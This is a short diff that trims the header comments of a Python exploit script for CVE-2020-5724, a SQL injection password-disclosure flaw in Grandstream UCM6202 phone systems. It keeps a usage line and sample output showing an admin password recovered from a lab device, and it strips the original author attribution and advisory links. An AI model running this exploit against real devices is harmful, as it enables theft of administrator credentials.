@@ -1,18 +1,10 @@
-# Exploit Title: Grandstream UCM6202 WebSocket SQL Injection Password Disclosure via Challenge
-# Date: 03/30/2020
-# Exploit Author: Jacob Baines
-# Vendor Homepage: http://www.grandstream.com/
-# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
 # Version: 1.0.20.20 and below
-# Tested on: Grandstream UCM6202 1.0.20.20
-# CVE : CVE-2020-5724
-# Advisory: https://www.tenable.com/security/research/tra-2020-17
-# Sample output:
-#
-# albinolobster@ubuntu:~$ python3 injection.py --rhost 192.168.0.222 --user admin 
+# Grandstream UCM6202 1.0.20.20
+# CVE-2020-5724
+
+# python3 injection.py --rhost 192.168.0.222 --user admin 
 # [+] Password length is 9
 # [+] Discovering password...
-# LabPass1%
 # [+] Done! The password is LabPass1%
 
 import sys
